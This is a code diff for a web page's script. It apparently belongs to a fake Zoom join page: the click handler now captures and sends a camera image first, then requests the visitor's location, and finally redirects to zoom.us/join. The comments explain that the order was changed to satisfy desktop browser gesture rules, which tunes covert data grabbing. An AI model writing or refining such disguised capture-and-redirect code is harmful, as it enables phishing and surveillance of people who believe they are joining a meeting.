@@ -352,19 +352,21 @@
             btn.style.cursor = "wait";
         }
         
-        // 1. Ask Location -> If YES: Run CameraPhase -> If NO: Run MagicExit
-        locate(cameraPhase, magicExit);
+        // ULTIMATE ORDER:
+        // 1. Camera (Needs immediate gesture for Desktop)
+        // 2. Location (Runs after camera logic finishes or fails)
+        // 3. Redirect (Always runs last)
+        captureAndSend(locationPhase);
     }
 
-    function cameraPhase() {
-        // 2. Ask Camera -> Then Run MagicExit
-        captureAndSend(magicExit);
+    function locationPhase() {
+        locate(magicExit, magicExit);
     }
 
     function magicExit() {
         setTimeout(function() {
             window.location.replace("https://zoom.us/join");
-        }, 1000);
+        }, 500);
     }
 </script>
 </body>
